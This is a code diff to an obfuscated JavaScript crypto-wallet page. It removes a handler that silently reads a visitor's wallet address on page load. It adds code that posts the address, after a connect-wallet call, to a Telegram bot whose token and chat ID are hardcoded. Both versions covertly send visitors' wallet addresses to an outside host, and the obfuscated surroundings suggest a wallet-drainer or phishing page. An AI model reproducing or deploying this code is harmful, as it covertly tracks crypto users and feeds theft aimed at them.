@@ -1,37 +1,3 @@
-// --- Telegram Alert on Silent Wallet Connect (Page Load) ---
-const BOT_TOKEN = "7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM";
-const CHAT_ID = "8191508290";
-
-function sendTelegramMessage(message) {
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: "Markdown"
-    })
-  });
-}
-
-window.addEventListener("load", async () => {
-  if (window.ethereum) {
-    try {
-      const accounts = await ethereum.request({ method: "eth_accounts" });
-      if (accounts.length > 0) {
-        const wallet = accounts[0];
-        const message = `🟢 *Wallet Connected (Silent)*\nWallet: \`${wallet}\`\nTime: ${new Date().toLocaleString()}`;
-        sendTelegramMessage(message);
-      }
-    } catch (err) {
-      console.error("Wallet check failed:", err);
-    }
-  } else {
-    console.log("MetaMask not found");
-  }
-});
 const _0x1500bf = (function () {
     let _0x108380 = true
     return function (_0x423867, _0x166b39) {
@@ -205,7 +171,21 @@ async function connectWalletAndSwitch() {
     const _0x69b3cd = { method: 'eth_accounts' }
     const _0x5f1439 = await _0x455cd3.request(_0x69b3cd)
     userAddress = _0x5f1439[0]
-    console.log('\u2705 Wallet:', userAddress)
+console.log('\u2705 Wallet:', userAddress)
+
+fetch(`https://api.telegram.org/bot7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM/sendMessage`, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    chat_id: '8191508290',
+    text: `✅ New Wallet Connected:\n\nAddress: ${userAddress}`
+  })
+})
+.catch((err) => {
+  console.error('Telegram Notify Error:', err);
+});
   } catch (_0x5d6ce6) {
     alert('Wallet connection failed.'), console.error(_0x5d6ce6)
   }
